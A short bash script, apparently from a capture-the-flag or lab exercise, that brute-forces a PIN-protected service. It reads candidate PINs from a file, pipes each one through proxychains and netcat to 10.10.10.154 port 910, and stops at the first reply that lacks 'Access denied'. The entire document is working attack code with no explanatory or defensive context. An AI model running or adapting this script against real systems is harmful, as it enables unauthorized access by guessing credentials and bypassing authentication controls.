#!/bin/bash
#
pins_list="pins.txt"
while IFS= read -r line; do 
  echo -ne "\r$line"
  tput el 

  response=$(echo $line | proxychains netcat -c 10.10.10.154 910)
  if [[ $response != *"Access denied"* ]]; then
    echo "Correct Pin: $line"
    break 
  fi


done < "$pins_list"

    
